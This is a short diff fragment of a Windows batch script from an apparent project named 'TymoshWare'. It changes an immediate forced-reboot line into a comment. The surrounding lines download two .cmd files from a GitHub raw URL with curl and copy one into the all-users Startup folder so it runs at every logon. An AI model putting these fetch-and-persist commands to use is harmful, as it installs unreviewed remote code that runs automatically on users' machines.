@@ -37,7 +37,7 @@ curl -o background.cmd https://raw.githubusercontent.com/smartpandapl/TymoshWare
 curl -o autostart.cmd https://raw.githubusercontent.com/smartpandapl/TymoshWare/main/autostart.cmd
 xcopy autostart.cmd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
-shutdown /r /t 0
+REM shutdown /r /t 0
 
 
 
